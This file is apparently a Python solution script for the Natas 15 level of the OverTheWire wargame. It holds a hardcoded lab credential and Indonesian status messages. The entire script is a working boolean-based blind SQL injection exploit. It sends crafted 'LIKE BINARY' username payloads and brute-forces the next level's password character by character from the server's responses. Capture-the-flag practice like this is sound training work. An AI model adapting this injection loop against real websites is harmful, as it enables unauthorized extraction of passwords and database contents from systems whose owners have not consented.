import requests
import string

def solve_natas15():
    """
    Solves the Natas 15 wargame challenge using a Python script.
    It performs a boolean-based blind SQL injection to find the password for Natas 16.
    """
    url = "http://natas15.natas.labs.overthewire.org/index.php"
    # Replace with the password from Natas 14
    auth = ("natas15", "yJgD99yA5jCSlQyRBG2M2tO8A7xJjW11") 
    
    password = ""
    # Characters to check for in the password
    chars = string.ascii_letters + string.digits 
    
    print("Mulai mencari kata sandi...")

    # Loop through a predefined number of characters
    for i in range(32):
        for char in chars:
            # The SQL injection payload
            payload = f'natas16" AND password LIKE BINARY "{password + char}%"'
            data = {'username': payload}
            
            # Send the request
            try:
                r = requests.post(url, auth=auth, data=data)
            except requests.exceptions.RequestException as e:
                print(f"Error saat mengirim permintaan: {e}")
                return

            # Check the server's response
            if "This user exists." in r.text:
                password += char
                print(f"Password ditemukan: {password}")
                break
        
        # If no character from the set matches, break the loop
        else:
            print("Tidak ada karakter yang cocok, menghentikan pencarian.")
            break
            
    print(f"\nKata sandi akhir: {password}")

if __name__ == "__main__":
    solve_natas15()
